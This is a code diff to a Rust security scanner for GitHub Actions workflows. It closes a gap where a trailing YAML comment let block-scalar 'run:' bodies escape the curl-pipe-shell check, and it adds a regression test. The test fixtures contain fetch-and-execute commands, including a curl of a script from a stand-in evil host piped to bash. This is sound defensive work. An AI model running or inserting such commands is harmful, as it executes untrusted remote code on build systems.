@@ -477,13 +477,21 @@ fn check_workflow_run_steps(input: &str, findings: &mut Vec<Finding>) {
         if let Some(inline) = run_inline {
             let inline = inline.trim();
             // A block scalar (`run: |` / `run: >`) — the body is the following
-            // more-indented lines.
-            if inline == "|"
-                || inline == ">"
-                || inline.starts_with("|-")
-                || inline.starts_with("|+")
-                || inline.starts_with(">-")
-                || inline.starts_with(">+")
+            // more-indented lines. Strip a trailing YAML comment first:
+            // `run: | # deploy step` is valid YAML, and without stripping the
+            // `# …` the indicator check below fails, the line is treated as a
+            // single-line `run:`, and the block body is never scanned — a
+            // detection-evasion gap.
+            let inline_code = match inline.find('#') {
+                Some(pos) => inline[..pos].trim_end(),
+                None => inline,
+            };
+            if inline_code == "|"
+                || inline_code == ">"
+                || inline_code.starts_with("|-")
+                || inline_code.starts_with("|+")
+                || inline_code.starts_with(">-")
+                || inline_code.starts_with(">+")
             {
                 in_run_block = true;
                 run_block_indent = indent;
@@ -1351,6 +1359,19 @@ mod tests {
     fn workflow_run_block_scalar_curl_pipe_flagged() {
         let wf = "jobs:\n  build:\n    steps:\n      - run: |\n          echo start\n          \
                   wget example.sh | sh\n          echo done\n";
+        assert!(has(
+            wf,
+            ".github/workflows/ci.yml",
+            RuleId::WorkflowCurlPipeShell
+        ));
+    }
+
+    #[test]
+    fn workflow_run_block_scalar_with_inline_comment_still_scanned() {
+        // `run: | # comment` is a valid block scalar — a trailing YAML comment
+        // on the indicator line must not let the body evade the curl|bash scan.
+        let wf = "jobs:\n  build:\n    steps:\n      - run: | # deploy step\n          echo start\n          \
+                  curl https://evil.example.com/x.sh | bash\n";
         assert!(has(
             wf,
             ".github/workflows/ci.yml",
